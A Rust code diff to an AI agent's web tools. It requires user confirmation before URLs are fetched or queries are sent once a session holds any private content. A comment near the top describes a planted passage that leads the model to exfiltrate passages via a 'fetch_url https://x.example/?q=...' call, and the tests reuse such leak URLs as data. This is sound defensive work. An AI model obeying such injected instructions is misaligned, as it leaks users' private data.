@@ -11,8 +11,11 @@
 //!
 //! What a call sends away can carry what the run has read: a planted
 //! passage can ask for `fetch_url https://x.example/?q=<the passages>`. Once
-//! the run has passages, a page is fetched without asking only when its URL
-//! is one of the run's web results or the user wrote it
+//! the session has had private content (passages in any run, opened
+//! document text, memories or history in a message, a message the app
+//! composed: [`ToolContext::private_content`]), a page is fetched without
+//! asking only when its URL is one of the run's web results or the user
+//! wrote it
 //! ([`fetch_needs_confirmation`]), and a search or paper query is sent
 //! without asking only when it is the user's own words
 //! ([`query_needs_confirmation`]); otherwise the user sees the full URL or
@@ -92,16 +95,16 @@ fn url_key(url: &str) -> &str {
     url.trim().trim_end_matches('/')
 }
 
-/// Whether fetching `url` must be confirmed: once the run has issued
-/// passages (`passages_issued`), unless `url` is one of the run's web
-/// results (`web_sources`) or appears in the user's own words.
+/// Whether fetching `url` must be confirmed: once the session has had
+/// private content (`private`), unless `url` is one of the run's web results
+/// (`web_sources`) or appears in the user's own words.
 pub fn fetch_needs_confirmation(
     url: &str,
-    passages_issued: u32,
+    private: bool,
     web_sources: &[String],
     user_words: Option<&str>,
 ) -> bool {
-    if passages_issued == 0 {
+    if !private {
         return false;
     }
     let wanted = url_key(url);
@@ -121,16 +124,13 @@ fn words_key(text: &str) -> String {
         .to_lowercase()
 }
 
-/// Whether sending the search `query` away must be confirmed: once the run
-/// has issued passages, unless the query is the user's own words (in their
-/// message, ignoring case and spacing). A rephrased query asks: telling a
-/// rephrasing apart from one that carries passage text is not reliable.
-pub fn query_needs_confirmation(
-    query: &str,
-    passages_issued: u32,
-    user_words: Option<&str>,
-) -> bool {
-    if passages_issued == 0 {
+/// Whether sending the search `query` away must be confirmed: once the
+/// session has had private content (`private`), unless the query is the
+/// user's own words (in their message, ignoring case and spacing). A
+/// rephrased query asks: telling a rephrasing apart from one that carries
+/// passage text is not reliable.
+pub fn query_needs_confirmation(query: &str, private: bool, user_words: Option<&str>) -> bool {
+    if !private {
         return false;
     }
     let wanted = words_key(query);
@@ -242,7 +242,7 @@ impl HostTool for WebSearchTool {
         let query = req_str(args, "query", WEB_SEARCH)?;
         Ok(query_needs_confirmation(
             query,
-            ctx.passages_issued(),
+            ctx.private_content(),
             ctx.user_words(),
         ))
     }
@@ -481,7 +481,7 @@ impl HostTool for FetchUrlTool {
         let url = req_str(args, "url", FETCH_URL)?;
         Ok(fetch_needs_confirmation(
             url,
-            ctx.passages_issued(),
+            ctx.private_content(),
             &ctx.web_sources(),
             ctx.user_words(),
         ))
@@ -626,7 +626,7 @@ impl HostTool for SearchPapersTool {
         let query = req_str(args, "query", SEARCH_PAPERS)?;
         Ok(query_needs_confirmation(
             query,
-            ctx.passages_issued(),
+            ctx.private_content(),
             ctx.user_words(),
         ))
     }
@@ -961,7 +961,7 @@ mod tests {
         // Nothing read yet: nothing private to send.
         assert!(!fetch_needs_confirmation(
             "https://x.example/?q=a",
-            0,
+            false,
             &[],
             None
         ));
@@ -972,52 +972,52 @@ mod tests {
             "https://example.com/article?leak=1",
             "https://docs.example.org/guide/../x?d=1",
         ] {
-            assert!(fetch_needs_confirmation(url, 3, &results, user), "{url}");
+            assert!(fetch_needs_confirmation(url, true, &results, user), "{url}");
         }
         // One of the run's web results, or a URL the user wrote, does not.
         assert!(!fetch_needs_confirmation(
             "https://example.com/article/",
-            3,
+            true,
             &results,
             user
         ));
         assert!(!fetch_needs_confirmation(
             "https://docs.example.org/guide",
-            3,
+            true,
             &results,
             user
         ));
-        assert!(fetch_needs_confirmation(" ", 3, &results, user));
+        assert!(fetch_needs_confirmation(" ", true, &results, user));
     }
 
     #[test]
     fn queries_ask_once_passages_are_in_the_run_unless_they_are_the_users_words() {
         let user = Some("What is SPANN   memory layout?");
-        assert!(!query_needs_confirmation("anything at all", 0, None));
-        assert!(!query_needs_confirmation("spann memory", 2, user));
+        assert!(!query_needs_confirmation("anything at all", false, None));
+        assert!(!query_needs_confirmation("spann memory", true, user));
         assert!(!query_needs_confirmation(
             "What is SPANN memory layout?",
-            2,
+            true,
             user
         ));
         assert!(query_needs_confirmation(
             "spann memory layout benchmarks",
-            2,
+            true,
             user
         ));
         assert!(query_needs_confirmation(
             "the confidential passage text",
-            2,
+            true,
             user
         ));
-        assert!(query_needs_confirmation("spann", 2, None));
+        assert!(query_needs_confirmation("spann", true, None));
     }
 
     #[tokio::test]
     async fn web_tools_ask_with_the_full_url_or_query_after_passages() {
         let (ctx, _rx) = ctx();
         let ctx = ctx.with_scope(Arc::new(crate::harness::tools::RunScope {
-            question: Some("Read https://example.com/article please".to_string()),
+            own_words: Some("Read https://example.com/article please".to_string()),
             ..Default::default()
         }));
         let fetch = FetchUrlTool::new(env(None), web_client());
@@ -1064,5 +1064,35 @@ mod tests {
                 "private words"
             );
         }
+    }
+
+    #[tokio::test]
+    async fn private_content_from_earlier_runs_or_the_message_still_asks() {
+        use crate::harness::tools::{RunPassages, RunScope};
+        let fetch = FetchUrlTool::new(env(None), web_client());
+        let leak = json!({"url": "https://x.example/?q=private"});
+        let session = Arc::new(RunPassages::new());
+        let (tx, _rx) = mpsc::unbounded_channel();
+        let first =
+            ToolContext::new("run-1", "step-1", tx.clone()).with_run_passages(Arc::clone(&session));
+        assert!(!fetch.must_confirm_in(&leak, &first).await.unwrap());
+        first.record_opened("C:/docs/a.pdf", "private words");
+        // The next run starts with no numbers, but the model still has them.
+        session.reset();
+        assert_eq!(session.issued(), 0);
+        let second =
+            ToolContext::new("run-2", "step-1", tx.clone()).with_run_passages(Arc::clone(&session));
+        assert!(fetch.must_confirm_in(&leak, &second).await.unwrap());
+
+        // A message carrying memories or history counts from its first call,
+        // and a URL in it is only the user's when it is in their own words.
+        let composed = ToolContext::new("run-3", "step-1", tx).with_scope(Arc::new(RunScope {
+            private_context: true,
+            question: Some("Earlier: https://x.example/?q=private".to_string()),
+            ..RunScope::default()
+        }));
+        assert!(composed.private_content());
+        assert_eq!(composed.user_words(), None);
+        assert!(fetch.must_confirm_in(&leak, &composed).await.unwrap());
     }
 }
